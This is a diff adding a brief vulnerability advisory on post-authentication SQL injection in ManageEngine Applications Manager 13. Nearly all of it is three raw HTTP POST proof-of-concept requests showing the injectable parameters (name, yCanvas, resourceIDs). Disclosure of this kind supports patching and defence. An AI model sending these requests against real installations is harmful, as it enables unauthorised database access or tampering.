@@ -1,0 +1,55 @@
+ManageEngine Applications Manager version 13 suffers from multiple post-authentication SQL injection vulnerabilities.
+
+
+Proof of Concept 1 (name= parameter is susceptible):
+
+POST /manageApplications.do?method=insert HTTP/1.1
+Host: 192.168.1.190:9090
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,pl;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 407
+Referer: http://192.168.1.190:9090/admin/createapplication.do?method=createapp&grouptype=1
+Cookie: testcookie=; am_username=; am_check=; liveapm-_zldp=IEKA1hnqJESNNXc4I4Ts1omY%2FiCOo47Ch6sZEoC7bRr4SfuGTOVfjv2JZAH6cun8; liveapm-_zldt=cfa03604-1dc4-4155-86f7-803952114141; diagnosticsAlarmTable_sortdir=down; JSESSIONID_APM_9090=A16B99B2C0C09EB6060B4372660CFBC3
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+org.apache.struts.taglib.html.TOKEN=66ef9ed22c8b3a67da50e905f7735abd&addmonitors=0&name=My+App2&description=Description....This+service+is+critical+to+our+business&grouptype=1&mgtypestatus%231001=on&mgtypes_1001=1&mgtypes_1007=0&mgtypes_1008=0&mgtypestatus%231002=on&mgtypes_1002=1&mgtypestatus%231003=on&mgtypes_1003=1&mgtypestatus%231004=on&mgtypes_1004=1&mgtypestatus%231006=on&mgtypes_1006=1&locationid=
+
+
+Proof of Concept 2 (crafted viewProps yCanvas field):
+
+POST /GraphicalView.do? HTTP/1.1
+Host: 192.168.1.191:9090
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,pl;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.1.191:9090/GraphicalView.do?&method=createBusinessService
+Content-Length: 457
+Cookie: JSESSIONID_APM_9090=53E8EBC71177607C3A7FE03EB238887E
+Connection: close
+
+&method=saveBusinessViewPropsForADDM&viewProps={"displayProps":{"showLabel":true,"showOnlyMGs":false,"showOnlyTopMGs":false,"showOnlyCritical":false,"showOnlyMGStatus":false,"backgroundColorVal":"#FFFFFF","lineColorVal":"#888c8f","textColorVal":"#444444","lineThickness":"2.5","lineTransparency":1,"xCanvas":-23.089912210349002,"yCanvas":0},"coordinates":"{\"totalNumberOfNodes\":0,\"nodeIdList\":[]}"}&haid=10000106&nodeIdVsResourceId={"node_1":"10000106"}
+
+
+Proof of Concept 3:
+
+POST /GraphicalView.do HTTP/1.1
+Host: 192.168.1.191:9090
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,pl;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.1.191:9090/showapplication.do?haid=10000106&method=showApplication&selectM=flashview&viewid=1
+Content-Length: 101
+Cookie: JSESSIONID_APM_9090=68C19C45D63C6FD102EB3DF25A8CE39D; testcookie=; am_username=; am_check=; am_mgview=availability
+Connection: close
+
+method=getLatestStatusForJIT&haid=10000106&viewid=1&currentime=1509869908111&resourceIDs=(0000106,0)
